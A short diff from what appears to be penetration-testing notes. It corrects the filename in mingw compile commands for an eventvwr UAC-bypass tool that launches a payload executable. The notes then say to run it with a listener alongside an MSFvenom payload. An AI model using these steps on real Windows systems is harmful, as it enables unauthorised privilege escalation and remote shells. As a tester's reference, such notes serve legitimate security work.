@@ -949,8 +949,8 @@ Change binary in evenvwrbypass.c to payload
 strcat(curPath, "\run.exe");
 
 Compile to .exe: 64 ot 32 bit
-x86_64-w64-mingw32-gcc evenvwrbypass.c -o eventvwr-bypassuac-64.exe
-i686-w64-mingw32-gcc evenvwrbypass.c -o eventvwr-bypassuac-32.exe
+x86_64-w64-mingw32-gcc eventvwrbypass.c -o eventvwr-bypassuac-64.exe
+i686-w64-mingw32-gcc eventvwrbypass.c -o eventvwr-bypassuac-32.exe
 # -static flag for library issues
 
 Run Executable with listener setup in same directory as MSFvenom payload
